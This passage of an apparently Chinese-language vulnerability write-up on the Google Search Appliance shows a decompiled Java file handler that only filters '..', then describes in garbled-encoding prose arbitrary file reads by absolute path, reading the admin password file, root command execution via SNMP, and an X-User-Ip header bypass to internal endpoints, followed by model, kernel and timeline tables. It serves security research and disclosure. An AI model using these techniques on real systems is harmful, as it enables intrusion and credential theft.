        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unreadable file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7fffffff&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;413&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;File too big:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MIME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTypeFromPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/octet-stream&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setContentType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lastModified&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDateHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Expires&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cacheExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Cache-Control&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;public&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;no&quot;&gt;IO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getOutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Strings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isEmpty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;..&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯ä»¥ç™¼ç¾æ­¤è™•åªæœ‰æª¢æŸ¥å­—ä¸²æ˜¯å¦å«æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; ï¼Œä½†æˆ‘å€‘å¯ä»¥ç›´æ¥æŒ‡å®šçµ•å°è·¯å¾‘ã€‚
ä¸¦ç›´æ¥è®€å–æœ¬æ©Ÿä»»æ„æª”æ¡ˆï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;èˆŠç‰ˆGSA æ²’æœ‰ /font é€™å€‹ç«¯é»ï¼Œä½† /dps/admin æœ‰é¡ä¼¼çš„è®€æª”å•é¡Œï¼Œå¯ä»¥ç›´æ¥æŒ‡å®š logName é€²è¡Œæª”æ¡ˆè®€å–ï¼Œ
å¯åƒè€ƒä¸‹åœ–ç›´æ¥è®€å–ç³»çµ±ç®¡ç†ä»‹é¢å¸³è™Ÿå¯†ç¢¼æª”ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æˆåŠŸç ´è§£é›œæ¹Šå¾Œï¼Œç™»å…¥å¾Œå¯ä»¥é–‹å•Ÿ SNMP æœå‹™é…åˆç¬¬ä¸€å€‹æ¼æ´ä¸¦ä»¥ root æ¬Šé™åŸ·è¡Œä»»æ„æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å…¶ä»–ç™¼ç¾è·Ÿæ•´ç†&quot;&gt;å…¶ä»–ç™¼ç¾è·Ÿæ•´ç†&lt;/h3&gt;

&lt;h4 id=&quot;æœå‹™æœ¬èº«å…§éƒ¨ç¶²å€&quot;&gt;æœå‹™æœ¬èº«å…§éƒ¨ç¶²å€&lt;/h4&gt;
&lt;p&gt;GSA ä¸­æœ‰è¨±å¤šçš„å­æœå‹™é–“ä½¿ç”¨ HTTP å‚³è¼¸å”å®šæºé€šï¼Œè€Œåœ¨è¨±å¤šæœå‹™éƒ½æœ‰æä¾› /varzã€/helpzã€/procz ç­‰ç¶²å€ï¼Œ
å¯ä»¥åœ¨æœå‹™å®šç¾©çš„ä¿¡ä»»ç¶²è·¯ä½ç½®æˆ– 127.0.0.1 ä¸­å­˜å–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œåœ¨ vGSA ä¸­è§€å¯Ÿåˆ°æœå‹™åŸ·è¡Œåƒæ•¸æœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;useripheader=X-User-Ip&lt;/code&gt; ï¼Œå°è‡´å°å¤–é–‹æ”¾çš„ç®¡ç†ä»‹é¢å¯ä»¥å¸¶å…¥ X-User-IP è«‹æ±‚é ­å¾Œç›´æ¥å­˜å–æ­¤åŠŸèƒ½ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;/procz ç«¯é»ç”šè‡³å¯ä»¥æŠ“å–åŸ·è¡Œæª”åŠä½¿ç”¨åˆ°çš„å…±äº«å‡½ç¤ºåº«ï¼š
&lt;img src=&quot;/assets/img/blog/20230707/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;å‹è™Ÿæ•´ç†&quot;&gt;å‹è™Ÿæ•´ç†&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;å‹è™Ÿ&lt;/th&gt;
      &lt;th&gt;è£½é€ å•†åŠå‹è™Ÿ&lt;/th&gt;
      &lt;th&gt;ç¡¬é«”è¦æ ¼&lt;/th&gt;
      &lt;th&gt;ç‰ˆè™Ÿ&lt;/th&gt;
      &lt;th&gt;æ–‡ä»¶æ•¸é‡&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;Pentium III 1G / 2GB memory / 120G&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;3.4.14&lt;/td&gt;
      &lt;td&gt;300,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google Mini-002X&lt;/td&gt;
      &lt;td&gt;SuperMicro&lt;/td&gt;
      &lt;td&gt;Pentium 4 3G / 2GB memory / 250G HDD&lt;/td&gt;
      &lt;td&gt;5.0.0&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1001&lt;/td&gt;
      &lt;td&gt;Dell Poweredge 2950&lt;/td&gt;
      &lt;td&gt;Xeon / 16GB memory / 1.25TB HDD&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;3,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-1002&lt;/td&gt;
      &lt;td&gt;Gigabyte&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-7007&lt;/td&gt;
      &lt;td&gt;Dell R710&lt;/td&gt;
      &lt;td&gt;Xeon E5520 / 48GB memory / 3TB HDD&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;10,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google GB-9009&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;Xeon X5560 / 96GB memory / 3.6TB HDD&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;30,000,000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G100&lt;/td&gt;
      &lt;td&gt;Dell R720XD&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Google G500&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;æ ¸å¿ƒç‰ˆæœ¬&quot;&gt;æ ¸å¿ƒç‰ˆæœ¬&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;GSA ç‰ˆæœ¬&lt;/th&gt;
      &lt;th&gt;æ ¸å¿ƒç‰ˆæœ¬&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;7.6.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.14.44_gsa-x64_1.5 (mrevutskyi@mrevutskyi.mtv.corp.google.com) (gcc version 4.9.x-google 20150123 (prerelease) (Google_crosstoolv18-gcc-4.9.x-x86_64-grtev4-linux-gnu) ) #1 SMP Mon Nov 23 09:19:11 PST 2015&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.4.0&lt;/td&gt;
      &lt;td&gt;æœªçŸ¥&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.5 (martincochran@ypc-ubiq202.dls.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Tue Jul 9 15:36:01 PDT 2013&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7.0.14&lt;/td&gt;
      &lt;td&gt;Linux version 3.4.3_gsa-x64_1.3 (stephenamar@neutrino.mtv.corp.google.com) (gcc version 4.6.x-google 20120601 (prerelease) (Google_crosstoolv15-gcc-4.6.x-glibc-2.11.1-grte) ) #1 SMP Thu Jul 19 11:59:57 PDT 2012&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5.2.0&lt;/td&gt;
      &lt;td&gt;Linux version 2.6.20_vmw-smp_3.1 (yifeng@yifeng.corp.google.com) (gcc version 4.1.1) #1 SMP Thu Jan 24 22:34:28 PST 2008&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;æ™‚é–“&lt;/th&gt;
      &lt;th&gt;äº‹ä»¶&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2005/06/10&lt;/td&gt;
      &lt;td&gt;Java Code Injection &lt;a href=&quot;https://seclists.org/fulldisclosure/2005/Nov/652&quot;&gt;CVE-2005-3757&lt;/a&gt; è¢« H D Moore å›å ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008 ä¸ŠåŠå¹´&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 5.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2008/10/28&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º vgsa_20081028.7z (5.2.0)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2013/04/20&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 6.14.0.G28&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/03/20&lt;/td&gt;
      &lt;td&gt;XSS æ¼æ´ &lt;a href=&quot;https://latesthackingnews.com/2014/05/03/xss-vulnerability-found-in-google-search-appliance/&quot;&gt;CVE-2014-0362&lt;/a&gt; è¢« Will Dormann å›å ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/01&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.0.14.G238&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/10/03&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.2.0.G252&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2014/12/12&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.2.0.G264&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/02/07&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.2.0.G270&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/15&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.4.0.G64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/22&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.4.0.G72&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/04/30&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.4.0.G74&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2015/06/04&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.4.0.G82&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016 ä¸ŠåŠå¹´&lt;/td&gt;
      &lt;td&gt;Google å®£å¸ƒ GSA å°‡æœƒé€æ­¥é€€å‡ºå¸‚å ´&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/01/05&lt;/td&gt;
      &lt;td&gt;XML å¤–éƒ¨å¯¦é«”æ”»æ“Š &lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;&lt;/a&gt; è¢« Timo å›å ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/05/24&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.0.G36&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/01&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.0.G42&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/07/31&lt;/td&gt;
      &lt;td&gt;æœ¬æ–‡ä½œè€…å–å¾—æ­¤è¨­å‚™ï¼Œç‰ˆæœ¬ç‚º 7.0.14&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/08/25&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.0.G46&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2016/10/21&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.0.G58&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/01/19&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.50.G30&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/04/19&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.50.G36&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/07/28&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.50.G64&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/11/09&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.250.G12&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2017/12/28&lt;/td&gt;
      &lt;td&gt;æœ€å¾Œèƒ½è¨‚è³¼ GSA çš„æ—¥æœŸ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/01/17&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.250.G20&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/03/21&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.250.G26&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/06/15&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.360.G10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2018/10/08&lt;/td&gt;
      &lt;td&gt;é‡‹å‡º GSA 7.6.360.G16&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
